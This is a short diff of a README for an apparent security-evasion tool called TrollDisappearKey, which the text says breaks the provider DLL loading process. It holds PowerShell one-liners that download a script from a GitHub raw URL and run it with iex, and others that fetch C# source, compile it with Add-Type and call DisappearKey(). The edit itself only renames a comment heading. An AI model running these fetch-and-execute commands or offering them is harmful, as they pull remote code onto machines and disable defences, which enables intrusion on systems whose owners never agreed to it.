@@ -22,7 +22,7 @@ This breaks the provider dlls loading process and we are able to assembly load a
 ##For PS Script
 iex(iwr https://raw.githubusercontent.com/cybersectroll/TrollDisappearKey/refs/heads/main/TrollDisappearKeyPS.ps1 -UseBasicParsing).content
 
-##For PS dll reflective
+##For PS dll reflective after dl to disk
 $code = (iwr https://raw.githubusercontent.com/cybersectroll/TrollDisappearKey/refs/heads/main/TrollDisappearKeyPS.cs -UseBasicParsing).content
 Add-Type $code
 [TrollDisappearKeyPS]::DisappearKey()
